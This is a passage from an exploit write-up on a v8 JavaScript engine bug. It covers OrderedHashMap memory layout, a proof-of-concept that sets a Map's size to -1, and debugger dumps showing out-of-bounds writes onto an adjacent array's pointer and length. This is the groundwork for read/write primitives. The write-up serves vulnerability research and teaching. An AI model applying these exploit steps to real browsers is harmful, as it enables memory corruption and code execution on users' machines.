</div><p>We can shift our focus towards the <code>table</code> properties which is an <code>OrderedHashMap</code> (I recommend you to read this <a href="https://itnext.io/v8-deep-dives-understanding-map-internals-45eb94a183df" target="_blank" rel="noopener noreffer ">article</a> to gain a better understanding of how the <code>OrderedHashMap</code> works in <code>v8</code>). <code>table</code> is the one that stores the <code>Map</code> elements, current capacity, and buckets.</p>
<p>Let&rsquo;s try to examine the <code>table</code> memory (Remember that we need to subtract the object address returned by the <code>%DebugPrint</code> by 1 in GDB).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; x/30wx 0x3ba20005381d-1
</span></span><span class="line"><span class="cl">0x3ba20005381c:	0x00002c29	0x00000022	0x00000004	0x00000000
</span></span><span class="line"><span class="cl">0x3ba20005382c:	0x00000004	0x00000002	0xfffffffe	0x00000002
</span></span><span class="line"><span class="cl">0x3ba20005383c:	0x00000002	0xfffffffe	0x00002459	0x00000002
</span></span><span class="line"><span class="cl">0x3ba20005384c:	0x00000000	0x000023e1	0x000023e1	0x000023e1
</span></span><span class="line"><span class="cl">0x3ba20005385c:	0x000023e1	0x000023e1	0x000023e1	0x000021b9
</span></span><span class="line"><span class="cl">0x3ba20005386c:	0x00000008	0x00000004	0x00000000	0x00197aa7
</span></span><span class="line"><span class="cl">0x3ba20005387c:	0x000023e1	0x000023e1	0x000021b9	0x00000008
</span></span><span class="line"><span class="cl">0x3ba20005388c:	0x00000008	0x00000000
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can use the <code>job</code> commands provided by the <code>v8</code> developers so that we can deduce what the raw data represents.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; job 0x3ba20005381d
</span></span><span class="line"><span class="cl">0x3ba20005381d: [OrderedHashMap]
</span></span><span class="line"><span class="cl"> - FixedArray length: 17
</span></span><span class="line"><span class="cl"> - elements: 2
</span></span><span class="line"><span class="cl"> - deleted: 0
</span></span><span class="line"><span class="cl"> - buckets: 2
</span></span><span class="line"><span class="cl"> - capacity: 4
</span></span><span class="line"><span class="cl"> - buckets: {
</span></span><span class="line"><span class="cl">              0: 1
</span></span><span class="line"><span class="cl">              1: -1
</span></span><span class="line"><span class="cl"> }
</span></span><span class="line"><span class="cl"> - elements: {
</span></span><span class="line"><span class="cl">              0: 1 -&gt; 1
</span></span><span class="line"><span class="cl"> }
</span></span><span class="line"><span class="cl">pwndbg&gt; job 0x3ba200002459
</span></span><span class="line"><span class="cl">0x3ba200002459: [Oddball] in ReadOnlySpace: #hole
</span></span></code></pre></td></tr></table>
</div>
</div><p>So, connecting the dots, the rough layout of some important metadata of the <code>OrderedHashMap</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">table + 0x10 =&gt; Map capacity (0x4)
</span></span><span class="line"><span class="cl">table + 0x14 =&gt; Bucket-0 data
</span></span><span class="line"><span class="cl">table + 0x18 =&gt; Bucket-1 data
</span></span><span class="line"><span class="cl">table + 0x1c =&gt; Entry-0 key (0x00000002)
</span></span><span class="line"><span class="cl">table + 0x20 =&gt; Entry-0 value (0x00000002)
</span></span><span class="line"><span class="cl">table + 0x24 =&gt; Entry-0 next_ptr
</span></span><span class="line"><span class="cl">table + 0x28 =&gt; Entry-1 key (0x00002459)
</span></span><span class="line"><span class="cl">table + 0x2c =&gt; Entry-1 value (0x00000002)
</span></span><span class="line"><span class="cl">table + 0x30 =&gt; Entry-1 next_ptr
</span></span></code></pre></td></tr></table>
</div>
</div><div class="details admonition info open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Info<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">Integer is represented as 31-bit in <code>v8</code>, which is why 0x1 is represented as 0x2. Another example, -1 is represented as 0xfffffffe in the raw memory data.</div>
        </div>
    </div>
<div class="details admonition info open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Info<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><code>v8</code> has pointer compression method (Read this <a href="https://blog.infosectcbr.com.au/2020/02/pointer-compression-in-v8.html" target="_blank" rel="noopener noreffer ">article</a> for a better understanding). tl;dr; <code>v8</code> only store lower 32-bit of a pointer in the memory, and storing the base upper 32-bit in a specific register. And every time <code>v8</code> want to use it, it will do calculation like <code>ptr = base_upper + stored_lower</code>. This is why when we set <code>hole</code> as the key, the stored value is only the lower 32-bit of the <code>hole</code> address, which is 0x2459.</div>
        </div>
    </div>
<div class="details admonition note open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-pencil-alt fa-fw" aria-hidden="true"></i>Note<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><code>job</code> is failed to print the map <code>elements</code> properly because of the second element&rsquo;s key is <code>hole</code>. In normal condition, the <code>job</code> command will print all the map <code>elements</code> correctly.</div>
        </div>
    </div>
<p>Reading through the previous article that I recommend you to read about the detailed implementation of <code>OrderedHashMap</code> in JS, some important key information about map:</p>
<ul>
<li>Capacity is required to be a power of 2</li>
<li>Number of buckets = Capacity / 2</li>
</ul>
<h3 id="the-corrupted-maps-impact">The corrupted map&rsquo;s impact</h3>
<p>Now, it&rsquo;s time for us to try to re-create the simple POC that the <code>crbug</code> article gave. I recommend you to read this <a href="https://medium.com/numen-cyber-labs/from-leaking-thehole-to-chrome-renderer-rce-183dcb6f3078" target="_blank" rel="noopener noreffer ">article</a> because it helps me a lot to exploit the corrupted map later. Let&rsquo;s change our <code>poc.js</code> file contents to like below:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Map</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">hole</span><span class="p">(),</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">hole</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">hole</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s try to examine this in the <code>gdb</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">d8&gt; m.size
</span></span><span class="line"><span class="cl">-1
</span></span></code></pre></td></tr></table>
</div>
</div><p>The POC is working, now we have a map where its size = <code>-1</code>. What is the impact? Let&rsquo;s just try to check the impact by trying to set a new pair of (key, value) to the corrupted map, hoping that we can somehow trigger Out-of-Bounds write.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">d8&gt; m.set(0x8, -1)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">... # Back to gdb and examine the table properties memory.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">pwndbg&gt; x/40wx 0x2b4f0027fbfd-1
</span></span><span class="line"><span class="cl">0x2b4f0027fbfc:	0x00002c29	0x00000022	0x00000000	0x00000000
</span></span><span class="line"><span class="cl">0x2b4f0027fc0c:	0x00000010	0xfffffffe	0xfffffffe	0x000023e1
</span></span><span class="line"><span class="cl">0x2b4f0027fc1c:	0x000023e1	0x000023e1	0x000023e1	0x000023e1
</span></span><span class="line"><span class="cl">0x2b4f0027fc2c:	0x000023e1	0x000023e1	0x000023e1	0x000023e1
</span></span><span class="line"><span class="cl">0x2b4f0027fc3c:	0x000023e1	0x000023e1	0x000023e1	0x000025d5
</span></span><span class="line"><span class="cl">0x2b4f0027fc4c:	0x928a22d2	0x00000004	0x29386428	0x000025d5
</span></span><span class="line"><span class="cl">0x2b4f0027fc5c:	0x71bade4e	0x00000006	0x69732e6d	0x0027657a
</span></span><span class="line"><span class="cl">0x2b4f0027fc6c:	0x00002231	0x00000004	0xe3e5e7e0	0x0027fc49
</span></span><span class="line"><span class="cl">0x2b4f0027fc7c:	0x00003039	0x00000004	0xb859fc74	0x0019a803
</span></span><span class="line"><span class="cl">0x2b4f0027fc8c:	0x000022c9	0x000006e8	0x0cebf631	0x31d00148
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that <code>table+0x10</code> value, which is the map&rsquo;s capacity got overwritten with our set key (<code>0x10</code> is the <code>0x8</code> integer representation in JS). Let&rsquo;s verify this with the <code>job</code> command.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; job 0x2b4f0027fbfd
</span></span><span class="line"><span class="cl">0x2b4f0027fbfd: [OrderedHashMap]
</span></span><span class="line"><span class="cl"> - FixedArray length: 17
</span></span><span class="line"><span class="cl"> - elements: 0
</span></span><span class="line"><span class="cl"> - deleted: 0
</span></span><span class="line"><span class="cl"> - buckets: 8
</span></span><span class="line"><span class="cl"> - capacity: 16
</span></span><span class="line"><span class="cl"> - buckets: {
</span></span><span class="line"><span class="cl">              0: -1
</span></span><span class="line"><span class="cl">              1: -1
</span></span><span class="line"><span class="cl">              2: 0x2b4f000023e1 &lt;undefined&gt;
</span></span><span class="line"><span class="cl">              3: 0x2b4f000023e1 &lt;undefined&gt;
</span></span><span class="line"><span class="cl">              4: 0x2b4f000023e1 &lt;undefined&gt;
</span></span><span class="line"><span class="cl">              5: 0x2b4f000023e1 &lt;undefined&gt;
</span></span><span class="line"><span class="cl">              6: 0x2b4f000023e1 &lt;undefined&gt;
</span></span><span class="line"><span class="cl">              7: 0x2b4f000023e1 &lt;undefined&gt;
</span></span><span class="line"><span class="cl"> }
</span></span><span class="line"><span class="cl"> - elements: {
</span></span><span class="line"><span class="cl"> }
</span></span></code></pre></td></tr></table>
</div>
</div><p>Voila, we have successfully overwritten the map&rsquo;s capacity, and because of that, the buckets got extended, and the elements&rsquo; location will be shifted as well.</p>
<p>That means, by corrupting the map size to <code>-1</code>, due to the corrupted <code>capacity</code> value after the first <code>map.set</code> call (after the size is -1), when the <code>map.set</code> method got called for the second time, it will store the <code>map</code> entry (<code>key</code>, <code>value</code>, <code>next_ptr</code>) in the outside of the <code>map</code> (OOB write to the objects below the <code>map</code> object).</p>
<p>Let&rsquo;s try to prove it by modifying our <code>poc.js</code> file to:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Map</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">hole</span><span class="p">(),</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">hole</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">hole</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">oob_arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Below is the <code>oob_arr</code> address retrieved from the <code>%DebugPrint</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="n">DebugPrint</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">DebugPrint</span><span class="p">:</span> <span class="mh">0x1d9d0028756d</span><span class="p">:</span> <span class="p">[</span><span class="n">JSMap</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="n">map</span><span class="p">:</span> <span class="mh">0x1d9d001862f1</span> <span class="o">&lt;</span><span class="n">Map</span><span class="p">[</span><span class="mi">16</span><span class="p">](</span><span class="n">HOLEY_ELEMENTS</span><span class="p">)</span><span class="o">&gt;</span> <span class="p">[</span><span class="n">FastProperties</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="n">prototype</span><span class="p">:</span> <span class="mh">0x1d9d00186431</span> <span class="o">&lt;</span><span class="ne">Object</span> <span class="n">map</span> <span class="o">=</span> <span class="mh">0x1d9d00186319</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="n">elements</span><span class="p">:</span> <span class="mh">0x1d9d00002259</span> <span class="o">&lt;</span><span class="n">FixedArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">[</span><span class="n">HOLEY_ELEMENTS</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="n">table</span><span class="p">:</span> <span class="mh">0x1d9d0028764d</span> <span class="o">&lt;</span><span class="n">OrderedHashMap</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="n">properties</span><span class="p">:</span> <span class="mh">0x1d9d00002259</span> <span class="o">&lt;</span><span class="n">FixedArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="n">All</span> <span class="n">own</span> <span class="n">properties</span> <span class="p">(</span><span class="n">excluding</span> <span class="n">elements</span><span class="p">):</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="n">DebugPrint</span><span class="p">(</span><span class="n">oob_arr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">DebugPrint</span><span class="p">:</span> <span class="mh">0x1d9d00287699</span><span class="p">:</span> <span class="p">[</span><span class="n">JSArray</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="n">map</span><span class="p">:</span> <span class="mh">0x1d9d0018e6bd</span> <span class="o">&lt;</span><span class="n">Map</span><span class="p">[</span><span class="mi">16</span><span class="p">](</span><span class="n">PACKED_DOUBLE_ELEMENTS</span><span class="p">)</span><span class="o">&gt;</span> <span class="p">[</span><span class="n">FastProperties</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="n">prototype</span><span class="p">:</span> <span class="mh">0x1d9d0018e11d</span> <span class="o">&lt;</span><span class="n">JSArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="n">elements</span><span class="p">:</span> <span class="mh">0x1d9d002876b1</span> <span class="o">&lt;</span><span class="n">FixedDoubleArray</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">[</span><span class="n">PACKED_DOUBLE_ELEMENTS</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="n">length</span><span class="p">:</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="n">properties</span><span class="p">:</span> <span class="mh">0x1d9d00002259</span> <span class="o">&lt;</span><span class="n">FixedArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="n">All</span> <span class="n">own</span> <span class="n">properties</span> <span class="p">(</span><span class="n">excluding</span> <span class="n">elements</span><span class="p">):</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x1d9d00006551</span><span class="p">:</span> <span class="p">[</span><span class="ne">String</span><span class="p">]</span> <span class="ow">in</span> <span class="n">ReadOnlySpace</span><span class="p">:</span> <span class="c1">#length: 0x1d9d00144255 &lt;AccessorInfo name= 0x1d9d00006551 &lt;String[6]: #length&gt;, data= 0x1d9d000023e1 &lt;undefined&gt;&gt; (const accessor descriptor), location: descriptor</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="n">elements</span><span class="p">:</span> <span class="mh">0x1d9d002876b1</span> <span class="o">&lt;</span><span class="n">FixedDoubleArray</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="mi">0</span><span class="p">:</span> <span class="mf">1.1</span>
</span></span><span class="line"><span class="cl">          <span class="mi">1</span><span class="p">:</span> <span class="mf">2.2</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s examine it in <code>gdb</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; x/30wx 0x1d9d0028764d-1
</span></span><span class="line"><span class="cl">0x1d9d0028764c:	0x00002c29	0x00000022	0xfffffffe	0x00000000
</span></span><span class="line"><span class="cl">0x1d9d0028765c:	0x00000004	0xfffffffe	0xfffffffe	0x000023e1
</span></span><span class="line"><span class="cl">0x1d9d0028766c:	0x000023e1	0x000023e1	0x000023e1	0x000023e1
</span></span><span class="line"><span class="cl">0x1d9d0028767c:	0x000023e1	0x000023e1	0x000023e1	0x000023e1
</span></span><span class="line"><span class="cl">0x1d9d0028768c:	0x000023e1	0x000023e1	0x000023e1	0x0018e6bd
</span></span><span class="line"><span class="cl">0x1d9d0028769c:	0x00002259	0x002876b1	0x00000004	0x00007779
</span></span><span class="line"><span class="cl">0x1d9d002876ac:	0x0019a879	0x00002ac1	0x00000004	0x9999999a
</span></span><span class="line"><span class="cl">0x1d9d002876bc:	0x3ff19999	0x9999999a
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that:</p>
<ul>
<li><code>oob_arr</code> is placed next to the <code>table</code> object (<code>oob_arr = table+0x4c = 0x1d9d0028764c+0x4c = 0x1d9d00287698</code>).</li>
<li><code>oob_arr</code> elements pointer is stored in <code>oob_arr+0x8 = table+0x54</code>.</li>
<li><code>oob_arr</code> length is stored in <code>oob_arr + 0xc = table+0x58</code>.</li>
</ul>
<p>Now, what happens if we corrupt the map <code>capacity</code> by calling <code>m.set(0x10, -1)</code>?</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">d8&gt; m.set(0x10, -1)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">... # Back to GDB
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">pwndbg&gt; x/30wx 0x1d9d0028764d-1
</span></span><span class="line"><span class="cl">0x1d9d0028764c:	0x00002c29	0x00000022	0x00000000	0x00000000
</span></span><span class="line"><span class="cl">0x1d9d0028765c:	0x00000020	0xfffffffe	0xfffffffe	0x000023e1
</span></span><span class="line"><span class="cl">0x1d9d0028766c:	0x000023e1	0x000023e1	0x000023e1	0x000023e1
</span></span><span class="line"><span class="cl">0x1d9d0028767c:	0x000023e1	0x000023e1	0x000023e1	0x000023e1
</span></span><span class="line"><span class="cl">0x1d9d0028768c:	0x000023e1	0x000023e1	0x000023e1	0x0018e6bd
</span></span><span class="line"><span class="cl">0x1d9d0028769c:	0x00002259	0x002876b1	0x00000004	0x00007779
</span></span><span class="line"><span class="cl">0x1d9d002876ac:	0x0019a879	0x00002ac1	0x00000004	0x9999999a
</span></span><span class="line"><span class="cl">0x1d9d002876bc:	0x3ff19999	0x9999999a
</span></span><span class="line"><span class="cl">pwndbg&gt; job 0x1d9d0028764d
</span></span><span class="line"><span class="cl">0x1d9d0028764d: [OrderedHashMap]
</span></span><span class="line"><span class="cl"> - FixedArray length: 17
</span></span><span class="line"><span class="cl"> - elements: 0
</span></span><span class="line"><span class="cl"> - deleted: 0
</span></span><span class="line"><span class="cl"> - buckets: 16
</span></span><span class="line"><span class="cl"> - capacity: 32
</span></span><span class="line"><span class="cl"> - buckets: {
</span></span><span class="line"><span class="cl">              0: -1
</span></span><span class="line"><span class="cl">              1: -1
</span></span><span class="line"><span class="cl">              2: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span class="line"><span class="cl">              3: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span class="line"><span class="cl">              4: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span class="line"><span class="cl">              5: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span class="line"><span class="cl">              6: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span class="line"><span class="cl">              7: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span class="line"><span class="cl">              8: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span class="line"><span class="cl">              9: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span class="line"><span class="cl">             10: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span class="line"><span class="cl">             11: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span class="line"><span class="cl">             12: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span class="line"><span class="cl">             13: 0x1d9d000023e1 &lt;undefined&gt;
</span></span><span class="line"><span class="cl">             14: 0x1d9d0018e6bd &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt;
</span></span><span class="line"><span class="cl">             15: 0x1d9d00002259 &lt;FixedArray[0]&gt;
</span></span><span class="line"><span class="cl"> }
</span></span><span class="line"><span class="cl"> - elements: {
</span></span><span class="line"><span class="cl"> }
</span></span></code></pre></td></tr></table>
</div>
</div><p>The impact is map&rsquo;s capacity is overwritten to <code>32</code>, which means the buckets got extended from <code>2</code> to <code>16</code>. The elements pointer is shifted, by <code>(16-2)*0x4 = 0x38</code> due to the extension of the buckets. So previously, the first element of the map&rsquo;s key was stored in <code>table+0x1c</code>, now it will be stored in <code>table+0x54</code>. The first element&rsquo;s value was stored in <code>table+0x20</code> previously, now after the corruption, it will be stored in <code>table+0x58</code>.</p>
<p>Remember that <code>table+0x54</code> is the <code>oob_arr</code> elements stored pointer, and <code>table+0x58</code> is the <code>oob_arr</code> length. So, after the corruption, if we call <code>map.set</code> for the third time, it will overwrite the <code>oob_arr</code> elements pointer and length. And with further techniques, we will be able to use the corrupted <code>oob_arr</code> as our read-and-write primitives.</p>
<p>Let&rsquo;s validate this by trying to do the third call of <code>map.set</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
